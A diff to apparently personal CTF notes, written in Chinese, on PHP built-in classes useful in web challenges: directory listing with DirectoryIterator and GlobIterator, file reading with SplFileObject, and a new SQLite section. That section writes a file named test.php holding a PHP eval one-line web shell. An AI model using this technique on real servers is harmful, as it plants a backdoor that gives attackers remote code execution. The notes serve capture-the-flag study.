@@ -17,6 +17,7 @@
 	- ((62efc5c6-a0d5-4eab-906e-0db03366b1e9))
 - # DirectoryIterator
   id:: 6478aaed-922b-471c-b8d6-ec1b0cb0444d
+	- 可以读取文件夹
 	- ```php
 	  $a=new DirectoryIterator("glob:///*");
 	  foreach($a as $f){
@@ -25,6 +26,7 @@
 	  ```
 	- FilesystemIterator与之类似
 - # GlobIterator
+	- 可以使用glob读取文件夹
 	- ```php
 	  <?php
 	  highlight_file(__file__);
@@ -38,3 +40,22 @@
 - # SplFileObject
 	- 可以读取文件，支持伪协议
 	- 例子：[[CTF/WP/GDOUCTF 2023 反方向的钟]]
+- # SQLite
+	- 可以实现文件创建/写入
+	- ```php
+	  <?php
+	  // 创建或连接数据库
+	  $db = new SQLite3('test.php');
+	  
+	  // 创建新表
+	  $query = 'CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, email TEXT)';
+	  $db->exec($query);
+	  
+	  // 向表中添加数据
+	  $query = 'INSERT INTO users (username, email) VALUES (\'TestUser\', \'<?php eval($_POST["data"]);\')';
+	  $db->exec($query);
+	  
+	  // 关闭数据库连接
+	  $db->close();
+	  
+	  ```
